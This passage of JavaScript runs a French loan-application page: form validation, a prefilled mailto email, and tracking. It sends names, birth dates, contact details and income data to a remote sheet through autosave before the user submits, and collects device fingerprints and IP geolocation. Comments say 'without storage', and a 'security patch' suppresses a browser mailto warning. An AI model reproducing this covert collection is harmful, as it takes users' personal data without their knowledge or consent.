    });

    const ctaBtn = document.querySelector('.cta-submit');
    if (ctaBtn) {
        ctaBtn.addEventListener('click', () => { 
            ctaClicked = true; 
            // Envoi événement CTA (bouton principal)
            const label = (ctaBtn.textContent || '').trim();
            sendCTAEventToSheet(label || 'cta_submit');
        });
    }

    // ========================================
    // 12. VALIDATION TEMPS RÉEL (sans stockage)
    // ========================================
    function setupRealTimeValidation() {
        const prenomInput = document.getElementById('prenom');
        const nomInput = document.getElementById('nom');
        const dateInput = document.getElementById('date-naissance');
        const emailInput = document.getElementById('email');
        const whatsappInput = document.getElementById('whatsapp');
        const paysSelect = document.getElementById('pays');

        [prenomInput, nomInput, dateInput, emailInput, whatsappInput, paysSelect].forEach(input => {
            if (input) {
                input.addEventListener('blur', validateStep1);
                input.addEventListener('change', () => {
                    validateStep1();
                    if (!formState.formStarted) formState.formStarted = true;
                });
            }
        });

        if (emailInput) {
            emailInput.addEventListener('blur', function() {
                const email = this.value.trim();
                if (email && !isValidEmail(email)) {
                    this.setCustomValidity('Adresse e-mail invalide');
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        if (whatsappInput) {
            whatsappInput.addEventListener('blur', function() {
                const phone = this.value.trim();
                if (phone && !isValidPhone(phone)) {
                    this.setCustomValidity('Numéro invalide');
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        const raisonInput = document.getElementById('raison');
        if (raisonInput) {
            raisonInput.addEventListener('input', validateStep2);
            raisonInput.addEventListener('blur', function() {
                const validation = validateRaison(this.value);
                if (this.value && !validation.valid) {
                    this.setCustomValidity(validation.error);
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        const statutSelect = document.getElementById('statut');
        const revenusSelect = document.getElementById('revenus');
        [statutSelect, revenusSelect].forEach(select => {
            if (select) select.addEventListener('change', validateStep3);
        });
    }

    // ========================================
    // 13. SOUMISSION FORMULAIRE (E-MAIL PRÉREMPLI)
    // ========================================
    function buildPrefilledEmail() {
        const prenom = (document.getElementById('prenom')?.value || '').trim();
        const nom = (document.getElementById('nom')?.value || '').trim();
        const fullName = `${prenom} ${nom}`.trim();
        const dateNaissance = (document.getElementById('date-naissance')?.value || '').trim();
        const email = (document.getElementById('email')?.value || '').trim();
        const whatsapp = (document.getElementById('whatsapp')?.value || '').trim();
        const pays = (document.getElementById('pays')?.value || '').trim();
        const montantVal = parseFloat(document.getElementById('montant')?.value || '0');
        const montantFmt = formatMontant(montantVal);
        const dureeMois = (document.getElementById('duree')?.value || '').trim();
        const raison = (document.getElementById('raison')?.value || '').trim();
        const statut = (document.getElementById('statut')?.value || '').trim();
        const revenus = (document.getElementById('revenus')?.value || '').trim();

        const pieces = [];
        if (document.getElementById('piece1')?.checked) pieces.push('carte d’identité');
        if (document.getElementById('piece2')?.checked) pieces.push('preuve de revenus');
        if (document.getElementById('piece3')?.checked) pieces.push('relevé bancaire récent');

        const mensualite = calculerMensualite(montantVal, parseInt(dureeMois || '0', 10), CONFIG.tauxInteret);
        const mensualiteFmt = formatEuros(isFinite(mensualite) ? mensualite : 0);

        const subject = `demande de financement ${montantFmt} ${nom} ${prenom}`.trim();

        const lines = [
            'Bonjour,',
            '',
            'Je me permets de vous contacter pour une demande de financement auprès de MSGROUPS.',
            `Je m’appelle ${fullName || '—'}, né(e) le ${dateNaissance || '—'}, et je réside en ${pays || '—'}.`,
            `Je souhaite obtenir un financement d’un montant de ${montantFmt} sur ${dureeMois || '—'} mois${raison ? ` pour ${raison}.` : '.'}`,
            `Ma mensualité estimée (taux indicatif ${CONFIG.tauxInteret} %/an) serait de ${mensualiteFmt}.`,
            '',
            'Voici mes coordonnées pour tout complément d’information :',
            `• E-mail : ${email || '—'}`,
            '',
            `• WhatsApp : ${whatsapp || '—'}`,
            '',
            `Côté situation : je suis actuellement ${statut || '—'}${revenus ? ` et ${revenus.toLowerCase()}` : ''}.`,
            `J’ai à disposition ${pieces.length ? `ma ${pieces.join(' et ')}` : 'les pièces nécessaires sur demande'}.`,
            '',
            'Je reste bien entendu à votre disposition pour tout renseignement ou document supplémentaire.',
            '',
            'Bien cordialement,',
            `${fullName || ''}`
        ];
        const body = lines.join('\n');

        const mailto = `mailto:Contact@sergemagdeleinesolutions.fr?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
        return mailto;
    }

    // ====== SECURITY PATCH: neutralise l'action "mailto:" pour éviter l'alerte Chrome
    const form = document.querySelector('form[action^="mailto"], form[action*="mailto"]') || document.getElementById('lead-form');
    if (form) {
        try {
            if (!form.dataset.mailto) {
                const raw = form.getAttribute('action') || '';
                const addr = raw.startsWith('mailto:') ? raw.replace(/^mailto:/i, '') : 'Contact@sergemagdeleinesolutions.fr';
                form.dataset.mailto = addr;
            }
            form.setAttribute('action', '#secure-submit');
            form.setAttribute('method', 'post');
            form.setAttribute('autocomplete', 'off');
            form.querySelectorAll('input, select, textarea').forEach(el => {
                el.setAttribute('autocomplete', 'off');
                el.setAttribute('autocapitalize', 'off');
                el.setAttribute('autocorrect', 'off');
                el.setAttribute('spellcheck', 'false');
            });
        } catch (e) {
            if (CONFIG.debugMode) console.warn('SECURITY PATCH form rewrite error:', e);
        }
    }
    // ====== FIN SECURITY PATCH ======

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            validateStep1();
            validateStep2();
            validateStep3();

            if (!formState.step1Valid || !formState.step2Valid || !formState.step3Valid) {
                let allErrors = [];
                if (formState.validationErrors.step1.length > 0) {
                    allErrors.push('ÉTAPE 1 - Informations de base :');
                    allErrors.push(...formState.validationErrors.step1.map(er => '  • ' + er));
                }
                if (formState.validationErrors.step2.length > 0) {
                    allErrors.push('\nÉTAPE 2 - Votre prêt :');
                    allErrors.push(...formState.validationErrors.step2.map(er => '  • ' + er));
                }
                if (formState.validationErrors.step3.length > 0) {
                    allErrors.push('\nÉTAPE 3 - Votre profil :');
                    allErrors.push(...formState.validationErrors.step3.map(er => '  • ' + er));
                }
                showNotification('Formulaire incomplet', 'Veuillez corriger les erreurs suivantes :\n\n' + allErrors.join('\n'), 'error');
                return false;
            }

            // Envoie un dernier autosave complet juste avant le mailto + flag CTA
            const label = (document.querySelector('.cta-submit')?.textContent || '').trim() || 'cta_submit';
            sendCTAEventToSheet(label);

            const mailtoLink = buildPrefilledEmail();
            window.location.href = mailtoLink;

            setTimeout(() => {
                showNotification('✅ Demande prête dans votre messagerie', 'Veuillez vérifier votre application e-mail (brouillon ouvert).', 'success');
            }, 600);
        });
    }

    // ========== CARROUSEL ==========
    const carousel = document.querySelector('.testimonials-carousel');
    const dots = document.querySelectorAll('.carousel-dot');
    let currentSlide = 0;

    if (carousel && dots.length > 0) {
        function goToSlide(index) {
            const slides = document.querySelectorAll('.testimonial-slide');
            if (index < 0 || index >= slides.length) return;
            currentSlide = index;
            const slideWidth = carousel.scrollWidth / slides.length;
            const scrollAmount = slideWidth * currentSlide;
            carousel.scrollTo({ left: scrollAmount, behavior: 'smooth' });
            updateDots();
        }

        function updateDots() {
            dots.forEach((dot, index) => {
                if (index === currentSlide) dot.classList.add('active');
                else dot.classList.remove('active');
            });
        }

        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => goToSlide(index));
        });

        updateDots();
    }

    // ========== NOTIFICATIONS ==========
    function showNotification(title, message, type = 'info') {
        const icons = { info: 'ℹ️', success: '✅', warning: '⚠️', error: '❌' };
        alert(`${icons[type]} ${title}\n\n${message}`);
    }

    // ========== SMOOTH SCROLL ==========
    function enableSmoothScroll() {
        const style = document.createElement('style');
        style.textContent = `html { scroll-behavior: smooth; }`;
        document.head.appendChild(style);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href === '#' || href === '#!') return;
            const target = document.querySelector(href);
            if (target) {
                e.preventDefault();
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                const menuToggle = document.getElementById('menu-toggle');
                if (menuToggle && menuToggle.checked) menuToggle.checked = false;
            }
        });
    });

    // ========== MENU MOBILE ==========
    const menuToggle = document.getElementById('menu-toggle');
    if (menuToggle) {
        document.addEventListener('click', function(e) {
            const navMenu = document.querySelector('.nav-menu');
            const menuIcon = document.querySelector('.menu-icon');
            if (menuToggle.checked && navMenu && !navMenu.contains(e.target) && !menuIcon.contains(e.target)) {
                menuToggle.checked = false;
            }
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && menuToggle.checked) {
                menuToggle.checked = false;
            }
        });
    }

    // ========================================
    // 14. COLLECTE + ENVOI → SHEET (AJOUTÉ)
    // ========================================

    // Parse UTM + referrer + landing
    function parseAcquisition() {
        const url = new URL(window.location.href);
        const p = url.searchParams;
        return {
            referrer: document.referrer || '',
            landing_url: window.location.href,
            utm_source: p.get('utm_source') || '',
            utm_medium: p.get('utm_medium') || '',
            utm_campaign: p.get('utm_campaign') || ''
        };
    }

    // Device / navigateur / écran
    function deviceInfo() {
        const ua = navigator.userAgent || navigator.userAgentData || '';
        const platform = navigator.platform || '';
        const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
        const tzOffsetMin = (new Date()).getTimezoneOffset(); // minutes

        // Détection simple
        let device_type = 'desktop';
        const w = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        if (w <= 768) device_type = 'mobile';
        else if (w > 768 && w <= 1024) device_type = 'tablet';

        // OS & browser (très basique)
        let os = /Windows/i.test(ua) ? 'Windows'
              : /Mac/i.test(ua) ? 'macOS'
              : /Android/i.test(ua) ? 'Android'
              : /iPhone|iPad|iPod/i.test(ua) ? 'iOS'
              : /Linux/i.test(ua) ? 'Linux'
              : platform || 'unknown';

        let browser = /Chrome/i.test(ua) ? 'Chrome'
                    : /Safari/i.test(ua) ? 'Safari'
                    : /Firefox/i.test(ua) ? 'Firefox'
                    : /Edg/i.test(ua) ? 'Edge'
                    : /OPR|Opera/i.test(ua) ? 'Opera'
                    : 'Unknown';

        return {
            device_type,
            os,
            browser,
            user_agent: String(ua),
            screen_width: (window.screen && window.screen.width) || '',
            screen_height: (window.screen && window.screen.height) || '',
            viewport_width: w,
            viewport_height: Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0),
            device_pixel_ratio: window.devicePixelRatio || 1,
            language: lang,
            timezone_offset_min: tzOffsetMin
        };
    }

    // Geo IP (best-effort, sans clé) — ipapi.co
    function fetchGeoAndSendOnce(basePayload) {
        // On tente un appel réseau ; si ça échoue, on envoie sans géo
        fetch('https://ipapi.co/json/', { method: 'GET' })
            .then(r => r.ok ? r.json() : null)
            .then(data => {
                const geo = {
                    country: (data && (data.country_name || data.country)) || '',
                    city: (data && data.city) || ''
                };
                postToSheet(Object.assign({}, basePayload, geo));
            })
            .catch(() => {
                postToSheet(basePayload);
            });
    }

    // Construit un snapshot des champs formulaire
    function readFormSnapshot() {
        // Champs étape 1
        const prenom = (document.getElementById('prenom')?.value || '').trim();
        const nom = (document.getElementById('nom')?.value || '').trim();
        const email = (document.getElementById('email')?.value || '').trim();
        const whatsapp = (document.getElementById('whatsapp')?.value || '').trim();
        const pays = (document.getElementById('pays')?.value || '').trim();
        const dateNaissance = (document.getElementById('date-naissance')?.value || '').trim();

        // Étape 2
        const montant = Number(document.getElementById('montant')?.value || '') || '';
        const duree = Number(document.getElementById('duree')?.value || '') || '';
        const raison = (document.getElementById('raison')?.value || '').trim();

        // Étape 3
        const statut = (document.getElementById('statut')?.value || '').trim();
        const revenus = (document.getElementById('revenus')?.value || '').trim();

        // Pièces (enchaînées)
        const pieces = [];
        if (document.getElementById('piece1')?.checked) pieces.push('Carte d\'identité');
        if (document.getElementById('piece2')?.checked) pieces.push('Preuve de revenus');
        if (document.getElementById('piece3')?.checked) pieces.push('Relevé bancaire récent');

        return {
            form_prenom: prenom,
            form_nom: nom,
            form_email: email,
            form_whatsapp: whatsapp,
            form_pays: pays,
            form_date_naissance: dateNaissance,
            form_montant_eur: montant,
            form_duree_mois: duree,
            form_raison: raison,
            form_statut: statut,
            form_revenus: revenus,
            form_pieces: pieces.join(' et ')
        };
    }

    // Throttle/dé-bounce simple pour autosave (éviter spam)
    let autosaveTimer = null;
    function autosaveToSheet() {
        clearTimeout(autosaveTimer);
        autosaveTimer = setTimeout(() => {
            const base = {
                session_id: SESSION.id,
                last_event: 'form_autosave'
            };
            const payload = Object.assign({}, base, readFormSnapshot());
            postToSheet(payload);
        }, 400);
    }

    // Envoi CTA
    function sendCTAEventToSheet(label) {
        const payload = Object.assign({
            session_id: SESSION.id,
            cta_clicked: true,
            cta_label: label || 'cta_submit',
            last_event: 'cta_click'
        }, readFormSnapshot());
        postToSheet(payload);
    }

    // Premier envoi "session_start" (avec device + acquisition + ts_open)
    function sendSessionStart() {
        const acq = parseAcquisition();
        const dev = deviceInfo();
        const base = Object.assign({
            session_id: SESSION.id,
            ts_open: SESSION.openedAtISO,
            last_event: 'session_start'
        }, acq, dev);

        // Essaye d'ajouter la géo IP ; si KO on envoie quand même
        fetchGeoAndSendOnce(base);
    }

    // ========================================
    // INITIALISATION
    // ========================================
    function init() {
        console.log('🚀 Initialisation MSGROUPS (sans stockage local)...');

        enableSmoothScroll();
        setupPromoBannerTimer();
        setupDateFormatting();
        createNextButtons();
        setupVideoPlayers();
        injectSummaryHitboxStyles();

        // Envoi d'ouverture de session (avec device/referrer/utm/géo)
        sendSessionStart();

        setTimeout(() => {
            validateStep1();
            validateStep2();
            validateStep3();
            afficherResumePret();
        }, 200);

        preventStepOpening();
        setupRealTimeValidation();

        // Autosave si sliders bougent (déjà appelés dans validateStep2, mais on redonde à la marge)
        if (montantSlider) montantSlider.addEventListener('change', autosaveToSheet);
        if (dureeSlider) dureeSlider.addEventListener('change', autosaveToSheet);

        console.log('✅ MSGROUPS - Prêt !  Session:', SESSION.id);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
